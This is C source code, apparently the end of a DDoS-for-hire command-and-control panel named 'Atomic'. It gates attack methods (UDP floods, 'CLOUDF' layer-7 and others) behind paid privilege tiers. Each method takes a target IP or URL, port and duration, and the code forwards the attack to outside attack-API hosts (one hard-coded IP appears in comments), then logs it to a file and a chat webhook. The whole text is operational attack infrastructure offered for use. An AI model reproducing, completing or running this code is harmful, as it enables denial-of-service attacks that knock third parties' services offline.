										// for (i = 0; i < 4; i++)
										//{
										//	apiattack(APISend[i]);
										//	printf("API[%d]: %s\r\n", i, APISend[i]);
										// }
										char APISend[1024];
										char syscall[1024];
										sprintf(APISend, "http://%s?key=%s&host=%s&port=%s&method=%s&time=%s", vl4ip, vl4key, Args[1], Args[2], Args[0], Args[3]);
										apiattack(APISend, datafd);
										memset(APISend, sizeof(APISend), 0);

										FILE *AttackDetector = fopen("Logs/Attacks.txt", "a+");
										fprintf(AttackDetector, "User: %s | Method: %s | Target: %s | Port: %s | Time: %s\r\n", Users[datafd].username, Args[0], Args[1], Args[2], Args[3]);
										fclose(AttackDetector);

										sprintf(syscall, "{\"content\": null,\"embeds\": [{\"title\": \"Atomic \",\"description\": \"**Attack Logs**\\n**Method**: __[%s]__\\n**Target**: __[%s]__\\n**Port**: __[%s]__\\n**Time**: __[%s]__\\n**User**: __[%s]__\",\"color\": 5814783}]}", Args[0], Args[1], Args[2], Args[3], Users[datafd].username);
										attackLogCurl(syscall);
									}
								}
								else
								{
									socketWrite(datafd, "\x1b[38;5;196mPort Invalid\x1b[38;5;015m: \x1b[38;5;202m");
									socketWrite(datafd, Args[2]);
									socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
								}
							}
							else
							{
								socketWrite(datafd, "\x1b[38;5;196mIP Invalid\x1b[38;5;015m: \x1b[38;5;202m");
								socketWrite(datafd, Args[1]);
								socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
							}
						}
						else
						{
							socketWrite(datafd, "\r\n\x1b[38;5;196mSorry this target \x1b[38;5;015m[\e[38;2;255;244;0m");
							socketWrite(datafd, target);
							socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;196mis black-listed!\r\n");
							socketWrite(datafd, "\e[38;2;255;0;166mPlease try another target \e[38;2;0;238;255m[\e[38;2;255;244;0m");
							socketWrite(datafd, Users[datafd].username);
							socketWrite(datafd, "\e[38;2;0;238;255m]\r\n");
							socketWrite(datafd, "\x1b\e[0m\r\n");
						}
					}
					else
					{
						socketWrite(datafd, "\r\n\x1b[38;5;196mInvalid Arguments ✗\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b[38;5;196mUser: \e[38;2;255;244;0m");
						socketWrite(datafd, Users[datafd].username);
						socketWrite(datafd, "\r\n\x1b[38;5;196mMETHOD IP PORT TIME\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b\e[0m\r\n");
					}
				}
				else
					socketWrite(datafd, "\e[38;2;255;0;166mYou do not have \e[38;2;0;238;255m[VIP] \e[38;2;255;0;166mprivileges\r\n");
			}
#endif
#ifdef rawL4
			else if (strjcmp(Args[0], "UDP1") || strjcmp(Args[0], "XTD") || strjcmp(Args[0], "SOCK") || strjcmp(Args[0], "RAND") || strjcmp(Args[0], "NFO1") || strjcmp(Args[0], "VSE"))
			{
				if (Users[datafd].rawstatus == 1 || Users[datafd].adminstatus == 1 || Users[datafd].br == 1 || Users[datafd].brvfmp == 1 || Users[datafd].brfmp == 1 || Users[datafd].ownerstatus == 1 || Users[datafd].brv == 1)
				{
					arglim = 4;

					arglim--;
					if (arglim < argcount)
					{
#ifdef DEBUG
						socketWrite(datafd, "\033[2J\033[1;1H");
						socketWrite(datafd, "\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b[38;5;082mEnough Arguments Provided\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b[38;5;082mUser: \e[38;2;255;244;0m");
						socketWrite(datafd, Users[datafd].username);
						socketWrite(datafd, "\r\n\x1b[38;5;082mPlan Type: \e[38;2;255;244;0m");
						socketWrite(datafd, accounts[FileLogin].status);
						socketWrite(datafd, "\r\n\x1b[38;5;082mMethod Used: \e[38;2;255;244;0m");
						socketWrite(datafd, Args[0]);
#endif
						int port = atoi(Args[2]), secs = atoi(Args[3]);

						char target[30];
						sprintf(target, "%s", Args[1]);
						trim(target);

						if (blacklistChecker(target) == 0)
						{
							socketWrite(datafd, "\r\n\x1b[38;5;082mTarget \x1b[38;5;015m[\e[38;2;255;244;0m");
							socketWrite(datafd, target);
							socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;082mis not black-listed\r\n");
							if (ValidIP(Args[1]))
							{
								socketWrite(datafd, "\x1b[38;5;082mIP Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
								socketWrite(datafd, Args[1]);
								socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
								if (port > 0 && port < 65536)
								{
									socketWrite(datafd, "\x1b[38;5;082mPort Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
									socketWrite(datafd, Args[2]);
									socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
									if (secs > atoi(Users[datafd].secs))
									{
										socketWrite(datafd, "\x1b[38;5;196mSeconds Above Max Allowed\x1b[38;5;015m: \x1b[38;5;202m");
										socketWrite(datafd, Args[3]);
										socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
									}
									else
									{
										socketWrite(datafd, "\x1b[38;5;082mSeconds Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
										socketWrite(datafd, Args[3]);
										socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
										// char APISend[10][1024];
										// sprintf(APISend[0], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// sprintf(APISend[1], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// sprintf(APISend[2], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// sprintf(APISend[3], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// for (i = 0; i < 4; i++)
										//{
										//	apiattack(APISend[i]);
										//	printf("API[%d]: %s\r\n", i, APISend[i]);
										// }
										char APISend[1024];
										char syscall[1024];
										sprintf(APISend, "http://%s?key=%s&host=%s&port=%s&method=%s&time=%s", rl4ip, rl4key, Args[1], Args[2], Args[0], Args[3]);
										apiattack(APISend, datafd);
										memset(APISend, sizeof(APISend), 0);

										FILE *AttackDetector = fopen("Logs/Attacks.txt", "a+");
										fprintf(AttackDetector, "User: %s | Method: %s | Target: %s | Port: %s | Time: %s\r\n", Users[datafd].username, Args[0], Args[1], Args[2], Args[3]);
										fclose(AttackDetector);

										sprintf(syscall, "{\"content\": null,\"embeds\": [{\"title\": \"Atomic \",\"description\": \"**Attack Logs**\\n**Method**: __[%s]__\\n**Target**: __[%s]__\\n**Port**: __[%s]__\\n**Time**: __[%s]__\\n**User**: __[%s]__\",\"color\": 5814783}]}", Args[0], Args[1], Args[2], Args[3], Users[datafd].username);
										attackLogCurl(syscall);
									}
								}
								else
								{
									socketWrite(datafd, "\x1b[38;5;196mPort Invalid\x1b[38;5;015m: \x1b[38;5;202m");
									socketWrite(datafd, Args[2]);
									socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
								}
							}
							else
							{
								socketWrite(datafd, "\x1b[38;5;196mIP Invalid\x1b[38;5;015m: \x1b[38;5;202m");
								socketWrite(datafd, Args[1]);
								socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
							}
						}
						else
						{
							socketWrite(datafd, "\r\n\x1b[38;5;196mSorry this target \x1b[38;5;015m[\e[38;2;255;244;0m");
							socketWrite(datafd, target);
							socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;196mis black-listed!\r\n");
							socketWrite(datafd, "\e[38;2;255;0;166mPlease try another target \e[38;2;0;238;255m[\e[38;2;255;244;0m");
							socketWrite(datafd, Users[datafd].username);
							socketWrite(datafd, "\e[38;2;0;238;255m]\r\n");
							socketWrite(datafd, "\x1b\e[0m\r\n");
						}
					}
					else
					{
						socketWrite(datafd, "\r\n\x1b[38;5;196mInvalid Arguments ✗\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b[38;5;196mUser: \e[38;2;255;244;0m");
						socketWrite(datafd, Users[datafd].username);
						socketWrite(datafd, "\r\n\x1b[38;5;196mMETHOD IP PORT TIME\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b\e[0m\r\n");
					}
				}
				else
					socketWrite(datafd, "\e[38;2;255;0;166mYou do not have \e[38;2;0;238;255m[RAW] \e[38;2;255;0;166mprivileges\r\n");
			}
#endif
#ifdef fmpL4
			else if (strjcmp(Args[0], "CYBER") || strjcmp(Args[0], "CLIMAX") || strjcmp(Args[0], "HYPER") || strjcmp(Args[0], "WHOST") || strjcmp(Args[0], "LABIXE"))
			{
				if (Users[datafd].fmpstatus == 1 || Users[datafd].adminstatus == 1 || Users[datafd].bvfmp == 1 || Users[datafd].bfmp == 1 || Users[datafd].brvfmp == 1 || Users[datafd].brfmp == 1 || Users[datafd].ownerstatus == 1)
				{
					arglim = 4;

					arglim--;
					if (arglim < argcount)
					{
#ifdef DEBUG
						socketWrite(datafd, "\033[2J\033[1;1H");
						socketWrite(datafd, "\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b[38;5;082mEnough Arguments Provided\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b[38;5;082mUser: \e[38;2;255;244;0m");
						socketWrite(datafd, Users[datafd].username);
						socketWrite(datafd, "\r\n\x1b[38;5;082mPlan Type: \e[38;2;255;244;0m");
						socketWrite(datafd, accounts[FileLogin].status);
						socketWrite(datafd, "\r\n\x1b[38;5;082mMethod Used: \e[38;2;255;244;0m");
						socketWrite(datafd, Args[0]);
#endif
						int port = atoi(Args[2]), secs = atoi(Args[3]);

						char target[30];
						sprintf(target, "%s", Args[1]);
						trim(target);

						if (blacklistChecker(target) == 0)
						{
							socketWrite(datafd, "\r\n\x1b[38;5;082mTarget \x1b[38;5;015m[\e[38;2;255;244;0m");
							socketWrite(datafd, target);
							socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;082mis not black-listed\r\n");
							if (ValidIP(Args[1]))
							{
								socketWrite(datafd, "\x1b[38;5;082mIP Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
								socketWrite(datafd, Args[1]);
								socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
								if (port > 0 && port < 65536)
								{
									socketWrite(datafd, "\x1b[38;5;082mPort Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
									socketWrite(datafd, Args[2]);
									socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
									if (secs > atoi(Users[datafd].secs))
									{
										socketWrite(datafd, "\x1b[38;5;196mSeconds Above Max Allowed\x1b[38;5;015m: \x1b[38;5;202m");
										socketWrite(datafd, Args[3]);
										socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
									}
									else
									{
										socketWrite(datafd, "\x1b[38;5;082mSeconds Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
										socketWrite(datafd, Args[3]);
										socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
										// char APISend[10][1024];
										// sprintf(APISend[0], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// sprintf(APISend[1], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// sprintf(APISend[2], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// sprintf(APISend[3], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// for (i = 0; i < 4; i++)
										//{
										//	apiattack(APISend[i]);
										//	printf("API[%d]: %s\r\n", i, APISend[i]);
										// }
										char APISend[1024];
										char syscall[1024];
										sprintf(APISend, "http://%s?key=%s&host=%s&port=%s&method=%s&time=%s", fl4ip, fl4key, Args[1], Args[2], Args[0], Args[3]);
										apiattack(APISend, datafd);
										memset(APISend, sizeof(APISend), 0);

										FILE *AttackDetector = fopen("Logs/Attacks.txt", "a+");
										fprintf(AttackDetector, "User: %s | Method: %s | Target: %s | Port: %s | Time: %s\r\n", Users[datafd].username, Args[0], Args[1], Args[2], Args[3]);
										fclose(AttackDetector);

										sprintf(syscall, "{\"content\": null,\"embeds\": [{\"title\": \"Atomic \",\"description\": \"**Attack Logs**\\n**Method**: __[%s]__\\n**Target**: __[%s]__\\n**Port**: __[%s]__\\n**Time**: __[%s]__\\n**User**: __[%s]__\",\"color\": 5814783}]}", Args[0], Args[1], Args[2], Args[3], Users[datafd].username);
										attackLogCurl(syscall);
									}
								}
								else
								{
									socketWrite(datafd, "\x1b[38;5;196mPort Invalid\x1b[38;5;015m: \x1b[38;5;202m");
									socketWrite(datafd, Args[2]);
									socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
								}
							}
							else
							{
								socketWrite(datafd, "\x1b[38;5;196mIP Invalid\x1b[38;5;015m: \x1b[38;5;202m");
								socketWrite(datafd, Args[1]);
								socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
							}
						}
						else
						{
							socketWrite(datafd, "\r\n\x1b[38;5;196mSorry this target \x1b[38;5;015m[\e[38;2;255;244;0m");
							socketWrite(datafd, target);
							socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;196mis black-listed!\r\n");
							socketWrite(datafd, "\e[38;2;255;0;166mPlease try another target \e[38;2;0;238;255m[\e[38;2;255;244;0m");
							socketWrite(datafd, Users[datafd].username);
							socketWrite(datafd, "\e[38;2;0;238;255m]\r\n");
							socketWrite(datafd, "\x1b\e[0m\r\n");
						}
					}
					else
					{
						socketWrite(datafd, "\r\n\x1b[38;5;196mInvalid Arguments ✗\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b[38;5;196mUser: \e[38;2;255;244;0m");
						socketWrite(datafd, Users[datafd].username);
						socketWrite(datafd, "\r\n\x1b[38;5;196mMETHOD IP PORT TIME\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b\e[0m\r\n");
					}
				}
				else
					socketWrite(datafd, "\e[38;2;255;0;0mYou do not have \e[38;2;255;0;230m[\e[38;2;0;255;60mFMP\e[38;2;255;0;230m] \e[38;2;255;0;0mprivileges to access this feature\r\n");
			}
#endif
#ifdef vipL7
			else if (strjcmp(Args[0], "CLOUDF"))
			{
				if (Users[datafd].vipstatus == 1 || Users[datafd].adminstatus == 1 || Users[datafd].bvfmp == 1 || Users[datafd].brvfmp == 1 || Users[datafd].ownerstatus == 1 || Users[datafd].brv == 1)
				{
					regex_t url;
					int urlvalue;
					urlvalue = regcomp(&url, "(http|https)://((\\w)*|([0-9]*)|([-|_])*)+([\\.|/]((\\w)*|([0-9]*)|([-|_])*))+", REG_EXTENDED);
					arglim = 4;

					arglim--;
					if (arglim < argcount)
					{
#ifdef DEBUG
						socketWrite(datafd, "\033[2J\033[1;1H");
						socketWrite(datafd, "\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b[38;5;082mEnough Arguments Provided\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b[38;5;082mUser: \e[38;2;255;244;0m");
						socketWrite(datafd, Users[datafd].username);
						socketWrite(datafd, "\r\n\x1b[38;5;082mPlan Type: \e[38;2;255;244;0m");
						socketWrite(datafd, accounts[FileLogin].status);
						socketWrite(datafd, "\r\n\x1b[38;5;082mMethod Used: \e[38;2;255;244;0m");
						socketWrite(datafd, Args[0]);
#endif
						int port = atoi(Args[2]), secs = atoi(Args[3]), urlpass = 1;
						urlvalue = regexec(&url, Args[1], 0, NULL, 0);
						regfree(&url);
						urlpass = urlcheck(urlvalue, datafd);

						char target[30];
						sprintf(target, "%s", Args[1]);
						trim(target);

						if (blacklistChecker(target) == 0)
						{
							socketWrite(datafd, "\r\n\x1b[38;5;082mTarget \x1b[38;5;015m[\e[38;2;255;244;0m");
							socketWrite(datafd, target);
							socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;082mis not black-listed\r\n");
							if (urlpass)
							{
								socketWrite(datafd, "\x1b[38;5;082mURL Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
								socketWrite(datafd, Args[1]);
								socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
								if (port > 0 && port < 65536)
								{
									socketWrite(datafd, "\x1b[38;5;082mPort Valid\x1b[38;5;015m: \e[38;2;255;244;0m");
									socketWrite(datafd, Args[2]);
									socketWrite(datafd, "\x1b[38;5;82m ✓\x1b\e[0m\r\n");
									if (secs > atoi(Users[datafd].secs))
									{
										socketWrite(datafd, "\x1b[38;5;196mSeconds Above Max Allowed\x1b[38;5;015m: \x1b[38;5;202m");
										socketWrite(datafd, Args[3]);
										socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
									}
									else
									{
										// socketWrite(datafd, "\x1b[38;5;082mSeconds Valid\x1b\e[0m\r\n");
										// char APISend[10][1024];
										// sprintf(APISend[0], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// sprintf(APISend[1], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// sprintf(APISend[2], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// sprintf(APISend[3], "http://198.12.120.177/nirapi.php?key=key&host=%s&port=%s&method=UDP-RAW&time=%s", Args[1], Args[2], Args[3]);
										// for (i = 0; i < 4; i++)
										//{
										//	apiattack(APISend[i]);
										//	printf("API[%d]: %s\r\n", i, APISend[i]);
										// }
										char APISend[1024];
										char syscall[1024];
										sprintf(APISend, "http://%s?key=%s&host=%s&port=%s&method=%s&time=%s", vl7ip, vl7key, Args[1], Args[2], Args[0], Args[3]);
										apiattack(APISend, datafd);
										memset(APISend, sizeof(APISend), 0);

										FILE *AttackDetector = fopen("Logs/Attacks.txt", "a+");
										fprintf(AttackDetector, "User: %s | Method: %s | Target: %s | Port: %s | Time: %s\r\n", Users[datafd].username, Args[0], Args[1], Args[2], Args[3]);
										fclose(AttackDetector);

										sprintf(syscall, "{\"content\": null,\"embeds\": [{\"title\": \"Atomic \",\"description\": \"**Attack Logs**\\n**Method**: __[%s]__\\n**Target**: __[%s]__\\n**Port**: __[%s]__\\n**Time**: __[%s]__\\n**User**: __[%s]__\",\"color\": 5814783}]}", Args[0], Args[1], Args[2], Args[3], Users[datafd].username);
										attackLogCurl(syscall);
									}
								}
								else
								{
									socketWrite(datafd, "\x1b[38;5;196mPort Invalid\x1b[38;5;015m: \x1b[38;5;202m");
									socketWrite(datafd, Args[2]);
									socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
								}
							}
							else
							{
								socketWrite(datafd, "\x1b[38;5;196mURL Invalid\x1b[38;5;015m: \x1b[38;5;202m");
								socketWrite(datafd, Args[1]);
								socketWrite(datafd, "\x1b[38;5;196m ✗\x1b\e[0m\r\n");
							}
						}
						else
						{
							socketWrite(datafd, "\r\n\x1b[38;5;196mSorry this target \x1b[38;5;015m[\e[38;2;255;244;0m");
							socketWrite(datafd, target);
							socketWrite(datafd, "\x1b[38;5;015m] \x1b[38;5;196mis black-listed!\r\n");
							socketWrite(datafd, "\e[38;2;255;0;166mPlease try another target \e[38;2;0;238;255m[\e[38;2;255;244;0m");
							socketWrite(datafd, Users[datafd].username);
							socketWrite(datafd, "\e[38;2;0;238;255m]\r\n");
							socketWrite(datafd, "\x1b\e[0m\r\n");
						}
					}
					else
					{
						socketWrite(datafd, "\r\n\x1b[38;5;196mInvalid Arguments ✗\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b[38;5;196mUser: \e[38;2;255;244;0m");
						socketWrite(datafd, Users[datafd].username);
						socketWrite(datafd, "\r\n\x1b[38;5;196mMETHOD IP PORT TIME\x1b\e[0m\r\n");
						socketWrite(datafd, "\x1b\e[0m\r\n");
					}
				}
				else
					socketWrite(datafd, "\e[38;2;255;0;166mYou do not have \e[38;2;0;238;255m[VIP] \e[38;2;255;0;166mprivileges\r\n");
			}
#endif
			else if (strjcmp(Args[0], "LEAVE") || strjcmp(Args[0], "EXIT") || strjcmp(Args[0], "LOGOUT") || strjcmp(Args[0], "logout") || strjcmp(Args[0], "leave") || strjcmp(Args[0], "exit"))
			{
				socketWrite(datafd, "\e[38;2;255;0;0mG");
				usleep(500000);
				socketWrite(datafd, "\e[38;2;255;145;0mO");
				usleep(500000);
				socketWrite(datafd, "\e[38;2;255;255;0mO");
				usleep(500000);
				socketWrite(datafd, "\e[38;2;38;255;0mD");
				usleep(500000);
				socketWrite(datafd, "\e[38;2;0;255;208mB");
				usleep(500000);
				socketWrite(datafd, "\e[38;2;0;89;255mY");
				usleep(500000);
				socketWrite(datafd, "\e[38;2;200;0;255mE");
				usleep(500000);
				socketWrite(datafd, "\e[38;2;255;0;187m!");
				usleep(500000);

				FILE *LogoutDetector = fopen("Logs/Logouts.txt", "a+");
				fprintf(LogoutDetector, "User: %s | Has logged out of Atomic \r\n", Users[datafd].username);
				fclose(LogoutDetector);

				goto End;
				AtomicNukes--;
				Users[datafd].confirmation = 0;
			}

			socketWrite(datafd, "\x1b[36m");
			argcount = 0;
			argcounter = 0;
		}
	}
End:;
	AtomicNukes--;
	Users[datafd].confirmation = 0;
	close(datafd);
	pthread_exit(0);
}

int main(int argc, char **argv)
{
	if (argc != 2)
	{
		printf("Invalid Usage: %s ConPort\n", argv[0]);
		return 0;
	}

	if (atoi(argv[1]) > 65535 || atoi(argv[1]) < 1)
	{
		printf("Invliad Connection Port\r\n");
		return 0;
	}

	ValidateFiles();

	pthread_t thread;
	pthread_create(&thread, NULL, (void *)TitleBar, (void *)NULL);
	pthread_create(&thread, NULL, (void *)Connections, (void *)(long)atoi(argv[1]));

	while (1)
		sleep(60);

	return 0;
}
